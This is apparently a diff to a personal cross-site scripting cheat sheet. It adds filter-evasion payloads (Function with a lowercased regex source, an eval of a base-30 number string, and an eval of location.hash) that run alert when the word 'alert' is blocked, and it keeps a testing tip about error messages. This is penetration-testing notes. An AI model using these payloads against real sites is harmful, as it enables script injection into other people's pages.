@@ -2,6 +2,12 @@
 
   *No aplhanumeric chars allowed
    http://www.jsfuck.com
+   
+  *filters word alert
+   Function(/ALERT(1337)/.source.toLowerCase())()
+   eval(8680439..toString(30))(1337)
+   eval(location.hash.slice(1))#alert(1)
+
 
   *On error message:
     - Determine what part of input is affecting the error, remove different parts to test
